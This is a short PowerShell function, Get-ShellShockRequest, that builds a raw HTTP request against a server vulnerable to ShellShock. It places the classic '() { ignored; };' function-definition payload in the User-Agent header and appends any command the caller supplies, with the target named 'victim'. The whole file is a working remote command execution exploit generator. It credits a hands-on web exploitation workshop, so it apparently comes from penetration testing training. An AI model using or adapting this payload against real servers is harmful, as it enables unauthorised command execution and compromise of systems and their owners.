function Get-ShellShockRequest {
    <#
    .SYNOPSIS
    Creates a shellshock web request

    .DESCRIPTION
    Get-ShellShockRequest generates a web request to send to a server vulnerable to ShellShock. 

    .PARAMETER victim
    The system to send the request.

    .PARAMETER url
    The url to send the request.

    .PARAMETER command
    The command being sent.

    .EXAMPLE
    
    
    .NOTES
    Written by JW @fpieces
    Concept was adapted from Michael Born's (@Blu3Gl0w13) AppSec 2015 Hands on Web Exploitation With Python Shellshock scripts.
    
    #>

    [CmdletBinding()]
    param (
        [parameter(Mandatory=$true)]
        [string]
        $victim,

        [parameter(Mandatory=$true)]
        [string]
        $url,

        [parameter(Mandatory=$true)]
        [string]
        $command
    )

    process {
        $headers = "GET " + $url + " HTTP/1.1`r`nHost: " + $victim + "`r`n"
        $payLoad = "User-Agent: () { ignored; }; echo Content-Type: text/plain; echo; echo; " + $command + ";"
        $headers2 = "Content-length: 0`r`n`r`n"

        $returnMessage = $headers + $payLoad + $headers2
        Write-Output $returnMessage
    }
}